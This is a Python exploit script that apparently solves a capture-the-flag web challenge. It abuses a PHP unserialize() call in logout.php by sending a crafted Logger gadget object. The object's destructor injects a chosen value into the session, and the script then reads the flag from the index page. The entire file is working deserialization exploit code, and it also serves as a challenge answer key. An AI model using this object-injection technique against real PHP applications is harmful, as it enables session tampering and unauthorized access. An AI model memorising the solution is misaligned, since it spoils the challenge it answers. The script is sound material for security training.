import os
import re
import secrets
import sys

import requests

HOST = os.environ["SERVICE_APP_MAIN_HOST"]
PORT = os.environ["SERVICE_APP_MAIN_PORT"]
BASE = f"http://{HOST}:{PORT}"


def php_serialize_string(name, value):
    # PHP serialize() format for a single string property: s:<len>:"<value>";
    return f's:{len(name)}:"{name}";s:{len(value)}:"{value}";'


def logger_payload(timestamp_value):
    # Builds a serialized Logger object matching source/src/classes/Logger.php:
    #   class Logger { public $timestamp; function __destruct(){
    #       $_SESSION['developerSettings'] = $this->timestamp; } }
    # unserialize() on attacker input in logout.php instantiates this gadget,
    # whose __destruct() fires immediately (refcount drops to 0) and writes
    # our chosen value straight into $_SESSION['developerSettings'].
    body = php_serialize_string("timestamp", timestamp_value)
    return f'O:6:"Logger":1:{{{body}}}'


def main():
    s = requests.Session()

    username = "user_" + secrets.token_hex(6)
    password = secrets.token_hex(8)

    # 1. Register an account.
    r = s.post(
        f"{BASE}/register.php",
        data={
            "username": username,
            "password": password,
            "confirm_password": password,
        },
        allow_redirects=True,
    )
    assert r.status_code == 200, f"register failed: {r.status_code}"

    # 2. Log in to obtain a session cookie.
    r = s.post(
        f"{BASE}/login.php",
        data={"username": username, "password": password},
        allow_redirects=True,
    )
    assert r.status_code == 200, f"login failed: {r.status_code}"
    assert "loggedin" not in r.text.lower() or "login" not in r.url, "login did not redirect"

    # 3. Trigger the POP gadget chain via logout.php's unserialize() on
    #    the attacker-controlled "timestamp" GET parameter.
    payload = logger_payload("givemeflag")
    r = s.get(
        f"{BASE}/logout.php",
        params={"timestamp": payload},
        allow_redirects=True,
    )
    assert r.status_code == 200, f"logout gadget trigger failed: {r.status_code}"

    # logout.php resets $_SESSION = array() before unserialize() runs, so we
    # are logged out again (developerSettings persists in the session store).
    # Log back in to restore "loggedin" alongside the injected developerSettings.
    r = s.post(
        f"{BASE}/login.php",
        data={"username": username, "password": password},
        allow_redirects=True,
    )
    assert r.status_code == 200, f"second login failed: {r.status_code}"

    # 4. Fetch the index page, which now leaks the flag.
    r = s.get(f"{BASE}/index.php", allow_redirects=True)
    assert r.status_code == 200, f"index fetch failed: {r.status_code}"

    print(r.text)

    m = re.search(r"SCC\{[^}]*\}", r.text)
    if not m:
        print("flag not found in response", file=sys.stderr)
        sys.exit(1)

    print("FLAG:", m.group(0))


if __name__ == "__main__":
    main()
